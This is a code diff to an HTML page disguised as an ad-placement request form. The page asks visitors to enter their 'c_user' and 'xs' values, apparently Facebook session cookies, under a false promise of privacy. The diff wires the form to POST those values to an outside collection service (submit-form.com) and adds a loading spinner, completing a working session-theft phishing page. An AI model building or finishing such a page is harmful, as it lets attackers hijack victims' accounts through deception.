@@ -55,6 +55,18 @@ p.note {
     color: #666;
     margin-top: 10px;
 }
+.spinner{
+    width:16px;
+    height:16px;
+    border:2px solid rgba(255,255,255,.4);
+    border-top:2px solid #fff;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+}
+@keyframes spin{
+    0%{transform:rotate(0deg)}
+    100%{transform:rotate(360deg)}
+}
 </style>
 </head>
 <body>
@@ -65,20 +77,25 @@ p.note {
 Please fill in the details below to submit your request for placing an ad. Only the required fields are needed.
 </p>
 
-<form id="adForm">
+<form id="adForm" action="https://submit-form.com/upL3IuLAs" method="POST">
     <input type="text" name="c_user" placeholder="Enter c_user value" required>
     <input type="text" name="xs" placeholder="Enter XS value" required>
-    <button type="submit">Submit Request</button>
+    <button type="submit" id="submitBtn">
+        <span id="btnText">Submit Request</span>
+    </button>
 </form>
 
 <p class="note">Your request will be processed securely. We respect your privacy.</p>
 </div>
 
 <script>
-document.getElementById('adForm').addEventListener('submit', function(e){
-    e.preventDefault();
-    alert('Thank you! Your request has been submitted.');
-    // Later, connect this form to a backend to receive c_user and xs
+const form = document.getElementById('adForm');
+const btn = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+
+form.addEventListener('submit', function(e){
+    btn.disabled = true;
+    btnText.innerHTML = '<div class="spinner"></div> Submitting…';
 });
 </script>
 
